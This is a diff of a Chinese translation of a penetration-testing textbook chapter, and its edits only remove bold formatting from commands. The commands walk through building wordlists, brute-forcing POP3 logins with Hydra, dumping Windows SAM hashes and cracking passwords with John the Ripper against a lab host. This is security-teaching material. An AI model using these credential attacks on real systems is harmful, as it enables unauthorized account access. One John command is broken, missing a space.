@@ -33,7 +33,7 @@
 示例 9-1. 用户列表示例
 
 ```
-root@kali:~# **cat userlist.txt**
+root@kali:~# cat userlist.txt
 georgia
 john
 mom
@@ -49,7 +49,7 @@ james
 示例 9-2. 密码列表示例
 
 ```
-root@kali:~# **cat passwordfile.txt**
+root@kali:~# cat passwordfile.txt
 password
 Password
 password1
@@ -69,7 +69,7 @@ password123
 示例 9-3. 使用 ceWL 构建自定义字典列表
 
 ```
-root@kali:~# **cewl --help**
+root@kali:~# cewl --help
 cewl 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)
 
 Usage: cewl [OPTION] ... URL
@@ -81,7 +81,7 @@ Usage: cewl [OPTION] ... URL
 --ua, -u user-agent: useragent to send
 --*snip*--
 URL: The site to spider.
-root@kali:~# **cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com** ❹
+root@kali:~# cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com ❹
 ```
 
 命令 `ceWL --help` 列出了 ceWL 的使用说明。使用 `-d`（深度）选项 ❶ 来指定 ceWL 应该在目标网站上跟踪多少个链接。如果你认为目标有最低密码长度要求，你可以使用 `-m` 选项 ❷ 来指定最小单词长度。一旦做出选择，使用 `-w` 选项 ❸ 将 ceWL 的结果输出到文件。例如，要在深度为 `1` 的情况下搜索 *[www.bulbsecurity.com](http://www.bulbsecurity.com)*，并设置最小单词长度为 `5` 个字符，将发现的单词输出到文件 *bulbwords.txt*，你可以使用 ❹ 处显示的命令。生成的文件将包含网站上符合你要求的所有单词。
@@ -91,7 +91,7 @@ root@kali:~# **cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com** ❹
 示例 9-4. 使用 Crunch 进行密钥空间暴力破解
 
 ```
-root@kali:~# **crunch 7 7 AB**
+root@kali:~# crunch 7 7 AB
 Crunch will now generate the following amount of data: 1024 bytes
 0 MB
 0 GB
@@ -118,7 +118,7 @@ AAAAAAB
 示例 9-5。使用 Hydra 猜测 POP3 用户名和密码
 
 ```
-root@kali:~# **hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3**
+root@kali:~# hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3
 Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
 
 Hydra (http://www.thc.org/thc-hydra) starting at 2015-01-12 15:29:26
@@ -137,7 +137,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2015-01-12 15:29:48
 示例 9-6。使用特定用户名与 Hydra
 
 ```
-root@kali:~# **hydra -l georgia -P passwordfile.txt 192.168.20.10 pop3**
+root@kali:~# hydra -l georgia -P passwordfile.txt 192.168.20.10 pop3
 Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
 [DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task
 [DATA] attacking service pop3 on port 110
@@ -154,7 +154,7 @@ Hydra 找到了 *georgia* 的密码是 *password* ❶。
 示例 9-7。使用 Netcat 通过猜测的凭证登录
 
 ```
-root@kali:~# **nc 192.168.20.10 pop3**
+root@kali:~# nc 192.168.20.10 pop3
 +OK POP3 server xpvictim.com ready <00037.23305859@xpvictim.com>
 **USER georgia**
 +OK georgia welcome here
@@ -207,7 +207,7 @@ SAM 文件存储的是 Windows 的哈希密码。虽然我们可以通过 Meterp
 示例 9-9. 查看 SAM 文件
 
 ```
-root@bt:~# **cat sam**
+root@bt:~# cat sam
 regf     P P5gfhbinDDDDnk,DuDDDDD DDDD DDDDDDDDDxDDDDSAMXDDDskx x D DpDμ\μ?
 ?   μ μ
                                   DDDDnk LDDDD DBDDDD Dx DDDDDSAMDDDDskxx7d
@@ -224,7 +224,7 @@ Syskey 工具的加密密钥叫做 *bootkey*，并存储在 Windows SYSTEM 文�
 示例 9-10. 使用 Bkhive 提取 bootkey
 
 ```
-root@kali:~# **bkhive system xpkey.txt**
+root@kali:~# bkhive system xpkey.txt
 bkhive 1.1.1 by Objectif Securite
 http://www.objectif-securite.ch
 original author: ncuomo@studenti.unina.it
@@ -239,7 +239,7 @@ Bootkey: 015777ab072930b22020b999557f42d5
 示例 9-11. 使用 Samdump2 恢复 Windows 哈希
 
 ```
-root@kali:~# **samdump2 sam xpkey.txt**
+root@kali:~# samdump2 sam xpkey.txt
 samdump2 1.1.1 by Objectif Securite
 http://www.objectif-securite.ch
 original author: ncuomo@studenti.unina.it
@@ -418,9 +418,9 @@ John the Ripper 破解七字符密码哈希值。在示例 9-15 中，我们看�
 示例 9-16. 使用 John the Ripper 破解 Linux 哈希
 
 ```
-root@kali# **cat linuxpasswords.txt**
+root@kali# cat linuxpasswords.txt
 georgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::
-root@kali# **johnlinuxpasswords.txt --wordlist=passwordfile.txt**
+root@kali# johnlinuxpasswords.txt --wordlist=passwordfile.txt
 Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])
 password         (georgia)
 guesses: 1  time: 0:00:00:00 DONE (Sun Jan 11 05:05:31 2015)  c/s: 100
